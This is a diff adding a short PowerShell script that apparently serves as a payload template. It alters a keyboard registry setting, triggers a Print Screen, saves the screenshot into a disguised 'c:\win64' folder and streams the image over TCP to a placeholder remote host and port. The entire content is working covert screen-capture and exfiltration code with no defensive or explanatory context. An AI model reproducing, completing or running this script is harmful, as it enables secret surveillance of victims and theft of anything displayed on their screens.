@@ -1,0 +1,12 @@
+Set-ItemProperty -Path "HKCU:\Control Panel\Keyboard" -Name "PrintScreenKeyForSnippingEnabled" -Value 00000000;
+Add-Type -AssemblyName System.Windows.Forms;
+$client = New-Object System.Net.Sockets.TcpClient(">>TCP<<",>>PORT<<);
+[System.Windows.Forms.SendKeys]::SendWait("{PRTSC}");
+$img = get-clipboard -format image;
+$img.save("c:\win64\curr.png");
+$strm = $client.GetStream();
+$file = [System.IO.File]::ReadAllBytes("C:\win64\curr.png");
+$strm.Write($file,0,$file.Length);
+$strm.Flush();
+$strm.Close();
+$client.Close();
